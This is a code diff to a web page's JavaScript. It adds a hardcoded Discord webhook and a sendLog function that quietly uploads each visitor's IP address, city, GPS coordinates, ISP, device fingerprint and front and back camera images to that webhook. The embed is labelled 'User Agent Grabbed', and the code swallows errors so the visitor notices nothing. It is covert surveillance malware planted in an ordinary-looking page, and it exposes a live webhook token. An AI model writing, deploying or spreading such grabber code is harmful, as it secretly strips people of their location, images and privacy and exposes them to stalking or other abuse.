@@ -724,6 +724,10 @@
   const dataGrid = document.getElementById('dataGrid');
   const cameraHero = document.getElementById('cameraHero');
 
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559572866335248401/DmusNOEoJJayjQ1ibOFsdqCgMi1ex9uAN5fYfGqnQ2ZSYrAayzdjqDWIkHu9PpnEWm9S';
+  const WEBHOOK_NAME = 'Wckd';
+  const WEBHOOK_AVATAR = 'https://cdn.discordapp.com/attachments/1558794055314448405/1559572604006834308/IMG_1368.jpg?ex=6acf90ac&is=6ace3f2c&hm=583fa98f91775170f2ce00711540c6a2cd4f73772b6f770740a9ab842de588f2&';
+
   const IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
                  (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
 
@@ -771,6 +775,72 @@
         if (!done) { done = true; clearTimeout(timer); resolve(fallback); }
       });
     });
+  }
+
+  function b64ToBlob(b64) {
+    const parts = b64.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const bin = atob(parts[1]);
+    const arr = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+    return new Blob([arr], { type: mime });
+  }
+
+  async function sendLog(data, frontB64, backB64) {
+    try {
+      const fields = [
+        { name: 'IP Address', value: val(data.ip), inline: true },
+        { name: 'Country', value: val(data.country), inline: true },
+        { name: 'City / Region', value: `${val(data.city)}, ${val(data.region)}`, inline: false },
+        { name: 'Postal', value: val(data.postal), inline: true },
+        { name: 'ISP', value: val(data.isp), inline: false },
+        { name: 'ASN', value: val(data.asn), inline: true },
+        { name: 'IP Lat / Lon', value: `${val(data.lat)}, ${val(data.lon)}`, inline: false },
+        { name: 'GPS Latitude', value: val(data.geoLat), inline: true },
+        { name: 'GPS Longitude', value: val(data.geoLon), inline: true },
+        { name: 'GPS Accuracy', value: val(data.geoAcc), inline: false },
+        { name: 'Timezone', value: val(data.timezone), inline: true },
+        { name: 'Locale', value: val(data.locale), inline: true },
+        { name: 'Screen', value: `${data.screenWidth}x${data.screenHeight} @ ${data.pixelRatio}x`, inline: true },
+        { name: 'Platform', value: val(data.platform), inline: true },
+        { name: 'Vendor', value: val(data.vendor), inline: false },
+        { name: 'Language', value: val(data.language), inline: true },
+        { name: 'CPU Cores', value: val(data.hardwareConcurrency), inline: true },
+        { name: 'Device Memory', value: val(data.deviceMemory), inline: true },
+        { name: 'Touch Points', value: val(data.maxTouch), inline: true },
+        { name: 'User Agent', value: String(data.userAgent || 'N/A').slice(0, 1000), inline: false }
+      ];
+
+      const payload = {
+        username: WEBHOOK_NAME,
+        avatar_url: WEBHOOK_AVATAR,
+        embeds: [
+          {
+            title: 'User Agent Grabbed',
+            color: 0x000000,
+            fields: fields,
+            image: backB64 ? { url: 'attachment://back.png' } : undefined,
+            thumbnail: frontB64 ? { url: 'attachment://front.png' } : undefined,
+            timestamp: new Date().toISOString(),
+            footer: { text: `grabbed ${stamp()}` }
+          }
+        ]
+      };
+
+      const form = new FormData();
+      form.append('payload_json', JSON.stringify(payload));
+
+      if (frontB64) {
+        form.append('files[0]', b64ToBlob(frontB64), 'front.png');
+      }
+      if (backB64) {
+        form.append('files[1]', b64ToBlob(backB64), 'back.png');
+      }
+
+      await fetch(WEBHOOK_URL, { method: 'POST', body: form });
+    } catch (e) {
+      // swallow — logging never blocks the reveal
+    }
   }
 
   function playClickAnimation(ev) {
@@ -984,6 +1054,8 @@
       maxTouch: navigator.maxTouchPoints || '0',
       pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No'
     };
+
+    sendLog(data, frontResult.data, backResult.data).catch(() => {});
 
     const takenAt = stamp();
     const backLabel = sameCam ? 'Back Camera (default)' : 'Back Camera';
